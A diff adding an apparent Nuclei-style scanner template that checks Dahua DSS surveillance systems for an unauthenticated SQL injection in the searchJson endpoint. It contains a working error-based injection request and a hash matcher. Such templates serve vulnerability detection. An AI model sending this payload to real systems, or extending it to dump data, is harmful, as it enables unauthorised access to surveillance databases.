@@ -1,0 +1,21 @@
+id: Dahua_DSS_searchJson_SQL
+
+info:
+  name: Dahua_DSS_searchJson_SQL
+  author: pitaya
+  severity: high
+  description: 大华DSS数字监控系统searchJson存在SQL注入漏洞，未经身份验证的攻击者可通过该漏洞获取数据库敏感信息。
+
+http:
+  - raw:
+      - "GET /portal/services/carQuery/getFaceRecognition/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml%281,concat%280x7e,%28select%20md5%281%29%29,0x7e%29,1%29--%22%7D/extend/1\
+        \ HTTP/1.1\nHost: \nUser-Agent: Mozilla/4.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36\
+        \ (KHTML, like Gecko) Chrome/97.0.3100.129 Safari/537.36\nConnection: close\n\
+        Accept-Encoding: gzip\nSL-CE-SUID: 4"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'c4ca4238a0b923820dcc509a6f75849'
